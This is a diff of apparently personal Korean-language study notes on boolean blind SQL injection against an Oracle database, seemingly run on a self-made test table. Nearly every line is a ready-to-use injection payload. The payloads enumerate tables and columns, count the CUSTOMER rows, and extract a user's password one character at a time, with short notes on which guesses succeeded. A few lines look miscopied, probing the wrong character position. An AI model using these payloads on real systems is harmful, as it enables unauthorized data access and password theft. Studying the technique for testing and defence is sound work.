@@ -1,5 +1,40 @@
 dd' and (select count(table_name) from user_tables)>1 -- 됨
 dd' and (select count(table_name) from user_tables)>100 -- 안됨 (이렇게 계속 테이블 갯수 확인
 dd' and (select count(table_name) from user_tables)>7 -- 됨
-dd' and (select count(table_name) from user_tables)>8 -- 안됨
-dd' and (select count(table_name) from user_tables)=8 --됨 ( 테이블 갯수가 8개임을 확인)
+dd' and (select count(table_name) from user_tables)>15 -- 안됨
+dd' and (select count(table_name) from user_tables)=15 --됨 ( 테이블 갯수가 15개임을 확인)
+
+첫번째 테이블 첫번째 글자 알아내기
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),1,1))>76 -- (76보다크다)
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),2,1))=85 -- (85 즉 U다)
+
+첫번째 테이블 두번째 글자 알아내기
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),2,1))>85 --
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),2,1))=83 -- (83 즉 S다)
+
+두번째 테이블 첫번째 글자 알아내기
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=2),1,1))>85 --
+dd' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=2),1,1))=77 --
+
+CUSTOMER 테이블의 전체 컬럼 수 알아내기 ( 뭐가 문제인지는 모르겠지만 이때 내가 만든 테이블명은 대소문자를 구분해야한다. )
+dd' AND (SELECT COUNT (column_name) FROM all_tab_columns WHERE table_name='CUSTOMER')>2 --
+dd' AND (SELECT COUNT (column_name) FROM all_tab_columns WHERE table_name='CUSTOMER')=5 --
+
+CUSTOMER 테이블의 첫번째 컬럼 첫번째 글자 알아내기 ( 여기서도 table_name는 대문자여야한다. 즉 where의 조건으로 테이블명이 들어갈땐 전부 대문자인듯 )
+dd' AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='CUSTOMER') WHERE RNUM=1),1,1))>84 --
+dd' AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='CUSTOMER') WHERE RNUM=1),1,1))=67 --
+
+CUSTOMER 테이블의 데이터 개수 알아내기
+dd' AND (SELECT COUNT(CUSTOMER_NUMBER) FROM CUSTOMER)>2 --
+dd' AND (SELECT COUNT(CUSTOMER_NUMBER) FROM CUSTOMER)>100 --
+dd' AND (SELECT COUNT(CUSTOMER_NUMBER) FROM CUSTOMER)=22 --
+
+CUSTOEMR 테이블의 1번째 계정의 비밀번호 첫번째 글자 알아내기
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),1,1))>96 --
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),1,1))>65 --
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),1,1))=71 --
+
+CUSTOEMR 테이블의 1번째 계정의 비밀번호 14번째 글자 알아내기
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),1,1))>96 --
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),1,1))>65 --
+dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),14,1))=52 --
